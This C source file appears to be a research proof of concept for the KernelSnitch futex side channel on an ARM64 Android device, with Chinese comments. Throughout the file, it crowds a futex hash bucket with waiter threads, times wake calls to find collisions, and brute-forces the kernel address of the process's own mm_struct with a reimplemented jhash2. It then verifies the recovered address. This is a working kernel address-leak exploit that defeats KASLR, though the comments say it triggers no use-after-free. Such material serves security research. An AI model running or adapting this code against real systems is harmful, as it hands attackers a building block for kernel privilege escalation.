/* e2e_probe.c - KernelSnitch G1+G2 真机端到端：对本进程未知 mm_struct 完整恢复
 *
 * 安全边界（与 collision_probe 相同，用户已授权）：
 *   - 只用 mmap + futex(FUTEX_WAIT/WAKE_PRIVATE) + cntvct_el0 计时
 *   - 不触发 GhostLock UAF、不写内核、不碰 /proc、不做持久化
 *   - 全部内核态副作用 = 本进程 256 个 waiter 线程的 futex 等待，退出即清零
 *
 * 流程（对齐 ref_pc/km00 kernelsnitch.h，缩小版）：
 *   G1: 256 线程堆积 inc_futex[128] 桶 -> 扫描候选地址计时找 >=5 个碰撞
 *       -> 暂停校验（真碰撞在 crowd 暂停后变冷）
 *   G2: 设备端暴力枚举 [0xffffff8000000000,+8GB) 步长 896，
 *       判据 = 全部碰撞(target+hits) 在 hsz=256 下同桶（必要条件，FP~9e-5）
 *       同时报告参考实现 OR 语义的候选
 *   验证: 用恢复的 mm* 预测"必然同桶"的新地址，实测命中率（正确 mm 应 ~100%）
 *       并对 H in {256..8192} 扫描 -> 实证 futex_hashsize
 */
#define _GNU_SOURCE
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <pthread.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <linux/futex.h>
#include <time.h>
#include <inttypes.h>

#define PAGE             4096
#define REGION_PAGES     65536                  /* 256 MB */
#define REGION_SZ        ((size_t)REGION_PAGES * PAGE)
#define WAITERS          256
#define REPEAT           32
#define AVG_N            8
#define TARGET_ID        128                    /* inc_futex 偏移 */
#define WANT_HITS        5
#define MAX_HITS         12
#define SCAN_LIMIT       40000                  /* 候选页数上限 */
#define MM_START         0xffffff8000000000ULL
#define MM_SPAN          (8ULL << 30)
#define MM_STEP          896                    /* mm_struct sz (slabinfo) */
#define NR_G2_THREADS    4
#define VERIF_PER_H      200

static volatile uint8_t *region;
static volatile uint32_t *inc_futex;            /* 堆积目标: region + TARGET_ID */
static volatile int g_stop = 0;
static volatile int g_pause = 0;
static uint64_t g_hits[MAX_HITS];
static int g_nhits = 0;
static uint64_t g_baseline;

static inline uint64_t rdtsc(void) {
    uint64_t v;
    __asm__ volatile("isb" ::: "memory");
    __asm__ volatile("mrs %0, cntvct_el0" : "=r"(v));
    __asm__ volatile("isb" ::: "memory");
    return v;
}

static int futex_op(uint32_t *uaddr, int op, uint32_t val, const struct timespec *to) {
    return (int)syscall(SYS_futex, uaddr, op, val, to, NULL, 0);
}

/* ---- mainline 4.9 jhash2 (与 tools/ksnitch_local_check.py 逐字对齐) ---- */
static inline uint32_t rol32(uint32_t w, unsigned s) { return (w << s) | (w >> (32 - s)); }
static inline void jmix(uint32_t *a, uint32_t *b, uint32_t *c) {
    *a -= *c; *a ^= rol32(*c, 4);  *c += *b;
    *b -= *a; *b ^= rol32(*a, 6);  *a += *c;
    *c -= *b; *c ^= rol32(*b, 8);  *b += *a;
    *a -= *c; *a ^= rol32(*c, 16); *c += *b;
    *b -= *a; *b ^= rol32(*a, 19); *a += *c;
    *c -= *b; *c ^= rol32(*b, 4);  *b += *a;
}
static inline void jfinal(uint32_t *a, uint32_t *b, uint32_t *c) {
    *c ^= *b; *c -= rol32(*b, 14);
    *a ^= *c; *a -= rol32(*c, 11);
    *b ^= *a; *b -= rol32(*a, 25);
    *c ^= *b; *c -= rol32(*b, 16);
    *a ^= *c; *a -= rol32(*c, 4);
    *b ^= *a; *b -= rol32(*a, 14);
    *c ^= *b; *c -= rol32(*b, 24);
}
static uint32_t jhash2(const uint32_t *k, uint32_t length, uint32_t initval) {
    uint32_t a, b, c;
    a = b = c = 0xdeadbeefu + (length << 2) + initval;
    while (length > 3) {
        a += k[0]; b += k[1]; c += k[2];
        jmix(&a, &b, &c);
        length -= 3; k += 3;
    }
    switch (length) {
    case 3: c += k[2]; /* fallthrough */
    case 2: b += k[1]; /* fallthrough */
    case 1: a += k[0]; jfinal(&a, &b, &c); break;
    }
    return c;
}
/* 私有 futex key: {mm, page_base, offset}; jhash2 输入 [mm_lo,mm_hi,page_lo,page_hi], initval=offset */
static uint32_t hash_from(uint64_t addr_va, uint64_t mm, uint32_t hsz) {
    uint64_t page = addr_va & ~0xfffULL;
    uint32_t k[4] = { (uint32_t)mm, (uint32_t)(mm >> 32),
                      (uint32_t)page, (uint32_t)(page >> 32) };
    return jhash2(k, 4, (uint32_t)(addr_va & 0xfff)) & (hsz - 1);
}

/* ---- waiter: 堆积 inc_futex 桶，可整体暂停 ---- */
static void *waiter_thread(void *arg) {
    (void)arg;
    struct timespec ts = { .tv_sec = 2, .tv_nsec = 0 };
    while (!g_stop) {
        if (g_pause) { usleep(20000); continue; }
        futex_op((uint32_t *)inc_futex, FUTEX_WAIT_PRIVATE, *inc_futex, &ts);
        usleep(1000);
    }
    return NULL;
}

static uint64_t measure(uint32_t *addr) {
    uint64_t s[REPEAT];
    for (int i = 0; i < REPEAT; i++) {
        uint64_t t0 = rdtsc();
        futex_op(addr, FUTEX_WAKE_PRIVATE, 1, NULL);
        uint64_t t1 = rdtsc();
        s[i] = t1 - t0;
    }
    for (int i = 0; i < REPEAT; i++)
        for (int j = i + 1; j < REPEAT; j++)
            if (s[j] < s[i]) { uint64_t x = s[i]; s[i] = s[j]; s[j] = x; }
    uint64_t sum = 0;
    for (int i = 0; i < AVG_N; i++) sum += s[i];
    return sum / AVG_N;
}

static void pause_crowd(void) {
    g_pause = 1;
    futex_op((uint32_t *)inc_futex, FUTEX_WAKE_PRIVATE, 0x7fffffff, NULL);
    usleep(300000);   /* 等 256 线程全部退出 WAIT */
}
static void resume_crowd(void) {
    g_pause = 0;
    usleep(200000);   /* 等线程重新入队 */
}

/* ---- G2: 设备端枚举 mm 候选 ----
 * 真实 mm 地址集合 = 16384 对齐 slab 页基址 + 896*j (j=0..17, order-2 每页 18 对象)。
 * 注意：从窗口起点步长 896 的朴素网格【不是】真实集合的超集（16384 mod 896=256,
 * gcd(256,896)=32），旧离线脚本 §五.5 该论断有误，本轮已实证修正。
 */
typedef struct { uint64_t cand; int which_or; } g2_hit_t;
static g2_hit_t g_strict[64]; static int g_nstrict = 0;   /* hsz=256 全等 */
static g2_hit_t g_or[64];     static int g_nor = 0;       /* 参考 OR 语义 */
static const uint32_t H_SIZES[9] = { 256,512,1024,2048,4096,8192,16384,32768,65536 };
#define SLAB_PAGE 16384
#define OBJS_PER_SLAB 18

static void g2_check_candidate(uint64_t c) {
    uint32_t h0 = hash_from((uint64_t)(uintptr_t)inc_futex, c, 256);
    int all256 = 1;
    for (int i = 0; i < g_nhits && all256; i++)
        all256 = (hash_from(g_hits[i], c, 256) == h0);
    if (!all256) return;
    if (g_nstrict < 64) { g_strict[g_nstrict].cand = c; g_strict[g_nstrict].which_or = -1; g_nstrict++; }
    /* 参考 OR 语义: 任一 hsz 下全等即接受 */
    for (int hs = 0; hs < 9; hs++) {
        uint32_t h0h = hash_from((uint64_t)(uintptr_t)inc_futex, c, H_SIZES[hs]);
        int ok = 1;
        for (int i = 0; i < g_nhits && ok; i++)
            ok = (hash_from(g_hits[i], c, H_SIZES[hs]) == h0h);
        if (ok) {
            if (g_nor < 64) { g_or[g_nor].cand = c; g_or[g_nor].which_or = H_SIZES[hs]; g_nor++; }
            break;
        }
    }
}

static void *g2_worker(void *arg) {
    size_t id = (size_t)(uintptr_t)arg;
    uint64_t k_start = (MM_SPAN / SLAB_PAGE) / NR_G2_THREADS * id;
    uint64_t k_end   = (MM_SPAN / SLAB_PAGE) / NR_G2_THREADS * (id + 1);
    for (uint64_t k = k_start; k < k_end; k++) {
        uint64_t base = MM_START + k * SLAB_PAGE;
        for (int j = 0; j < OBJS_PER_SLAB; j++)
            g2_check_candidate(base + (uint64_t)j * MM_STEP);
    }
    return NULL;
}

int main(void) {
    FILE *out = fopen("/data/local/tmp/ks_e2e_result.txt", "w");
    pthread_t tids[WAITERS];
    uint64_t t_all0 = rdtsc();

    fprintf(out, "e2e start\n"); fflush(out);
    uint64_t frq; __asm__ volatile("mrs %0, cntfrq_el0" : "=r"(frq));
    long ncpu = sysconf(_SC_NPROCESSORS_ONLN);
    printf("cntfrq=%" PRIu64 " online_cpus=%ld (futex_hashsize 预期 256*ncpu pow2)\n", frq, ncpu);
    fprintf(out, "cntfrq=%" PRIu64 " online_cpus=%ld\n", frq, ncpu);

    region = mmap(NULL, REGION_SZ, PROT_READ | PROT_WRITE,
                  MAP_PRIVATE | MAP_ANONYMOUS | MAP_NORESERVE, -1, 0);
    if (region == MAP_FAILED) { perror("mmap"); return 2; }
    memset((void *)region, 0, REGION_SZ);
    inc_futex = (volatile uint32_t *)(region + TARGET_ID);

    /* 1. 堆积 */
    printf("spawning %d waiters on inc_futex...\n", WAITERS);
    for (int i = 0; i < WAITERS; i++)
        if (pthread_create(&tids[i], NULL, waiter_thread, NULL) != 0) {
            printf("pthread_create failed at %d\n", i); g_stop = 1;
            for (int k = 0; k < i; k++) pthread_join(tids[k], NULL);
            return 3;
        }
    usleep(500000);

    /* 2. 基线 */
    uint64_t b1 = measure((uint32_t *)(region + PAGE));
    uint64_t b2 = measure((uint32_t *)(region + PAGE + 8));
    g_baseline = b1 < b2 ? b1 : b2;
    uint64_t t_meas = measure((uint32_t *)inc_futex);
    printf("baseline=%" PRIu64 " inc_target=%" PRIu64 " ratio=%.1f\n",
           g_baseline, t_meas, (double)t_meas / g_baseline);
    fprintf(out, "baseline=%" PRIu64 " inc_target=%" PRIu64 "\n", g_baseline, t_meas);

    /* 3. 扫描碰撞 */
    for (int i = 1; i < SCAN_LIMIT && g_nhits < MAX_HITS; i++) {
        uint64_t id = (uint64_t)i * PAGE | (uint32_t)((i * 8) % PAGE);
        uint32_t *addr = (uint32_t *)(region + id);
        if (addr == (uint32_t *)inc_futex) continue;
        uint64_t t = measure(addr);
        if (t > g_baseline * 10) {
            g_hits[g_nhits++] = (uint64_t)(uintptr_t)addr;
            printf("  hit[%d] %p ticks=%" PRIu64 "\n", g_nhits, (void *)addr, t);
            fprintf(out, "hit %d %p ticks=%" PRIu64 "\n", g_nhits, (void *)addr, t);
        }
    }
    printf("raw hits=%d\n", g_nhits);

    /* 4. 暂停校验：真碰撞应变冷 */
    pause_crowd();
    int nreal = 0;
    for (int i = 0; i < g_nhits; i++) {
        uint64_t t = measure((uint32_t *)(uintptr_t)g_hits[i]);
        int hot = t > g_baseline * 5;
        printf("  pause-check hit[%d] ticks=%" PRIu64 " -> %s\n",
               i + 1, t, hot ? "STILL HOT (spurious, drop)" : "cold (real)");
        fprintf(out, "pausecheck %d %d %" PRIu64 "\n", i, hot, t);
        if (!hot) g_hits[nreal++] = g_hits[i];
    }
    g_nhits = nreal;
    resume_crowd();
    printf("real hits after pause-check = %d\n", g_nhits);
    fprintf(out, "realhits %d\n", g_nhits);
    if (g_nhits < WANT_HITS) {
        printf("FAIL: fewer than %d real collisions; end-to-end not completed.\n", WANT_HITS);
        fprintf(out, "FAIL hits\n");
        goto cleanup;
    }

    /* 5. G2 设备端枚举 */
    {
        pthread_t g2t[NR_G2_THREADS];
        for (size_t k = 0; k < NR_G2_THREADS; k++)
            pthread_create(&g2t[k], NULL, g2_worker, (void *)(uintptr_t)k);
        for (int k = 0; k < NR_G2_THREADS; k++) pthread_join(g2t[k], NULL);
    }
    printf("G2 strict(hsz=256) candidates=%d  OR-semantics candidates=%d\n",
           g_nstrict, g_nor);
    for (int i = 0; i < g_nstrict && i < 16; i++) {
        printf("  strict[%d] mm=%016" PRIx64 "\n", i, g_strict[i].cand);
        fprintf(out, "strict %d %016" PRIx64 "\n", i, g_strict[i].cand);
    }
    for (int i = 0; i < g_nor && i < 16; i++) {
        printf("  or[%d] mm=%016" PRIx64 " (hsz=%u)\n", i, g_or[i].cand, g_or[i].which_or);
        fprintf(out, "or %d %016" PRIx64 " %u\n", i, g_or[i].cand, g_or[i].which_or);
    }
    if (g_nstrict != 1) {
        printf("NOTE: strict candidate count = %d (expect 1)\n", g_nstrict);
        fprintf(out, "strictcnt %d\n", g_nstrict);
    }
    uint64_t mm = g_nstrict ? g_strict[0].cand : 0;
    fprintf(out, "recovered_mm %016" PRIx64 "\n", mm);

    /* 6. 验证: 预测必然同桶的新地址 + hashsize 扫描 */
    if (mm) {
        static const uint32_t HS[] = { 256, 512, 1024, 2048, 4096, 8192 };
        for (int hs = 0; hs < 6; hs++) {
            uint32_t H = HS[hs];
            uint32_t Bh = hash_from((uint64_t)(uintptr_t)inc_futex, mm, H);
            int tested = 0, hotn = 0;
            for (int p = 33000; p < REGION_PAGES && tested < VERIF_PER_H; p++) {
                for (int off = 8; off < PAGE && tested < VERIF_PER_H; off += 128) {
                    uint64_t va = (uint64_t)(uintptr_t)(region + (size_t)p * PAGE + off);
                    if (hash_from(va, mm, H) != Bh) continue;
                    uint64_t t = measure((uint32_t *)(uintptr_t)va);
                    if (t > g_baseline * 10) hotn++;
                    tested++;
                }
            }
            if (!tested) { printf("  H=%u: no predicted addresses found\n", H); continue; }
            printf("  H=%u: predicted=%d hot=%d rate=%.1f%%\n",
                   H, tested, hotn, 100.0 * hotn / tested);
            fprintf(out, "verify %u %d %d\n", H, tested, hotn);
        }
        /* 对照组: 随机地址（期望 ~0.05%） */
        int tested = 0, hotn = 0;
        for (int p = 33000; p < 40000 && tested < VERIF_PER_H; p++) {
            uint64_t va = (uint64_t)(uintptr_t)(region + (size_t)p * PAGE + 64);
            uint64_t t = measure((uint32_t *)(uintptr_t)va);
            if (t > g_baseline * 10) hotn++;
            tested++;
        }
        printf("  control(random): hot=%d/%d\n", hotn, tested);
        fprintf(out, "control %d %d\n", tested, hotn);
    }

    printf("total elapsed = %.1f s\n", (double)(rdtsc() - t_all0) / frq);
    fprintf(out, "elapsed %.1f\n", (double)(rdtsc() - t_all0) / frq);

cleanup:
    g_stop = 1;
    g_pause = 0;
    futex_op((uint32_t *)inc_futex, FUTEX_WAKE_PRIVATE, 0x7fffffff, NULL);
    for (int i = 0; i < WAITERS; i++) pthread_join(tids[i], NULL);
    munmap((void *)region, REGION_SZ);
    fclose(out);
    printf("cleanup done.\n");
    return 0;
}
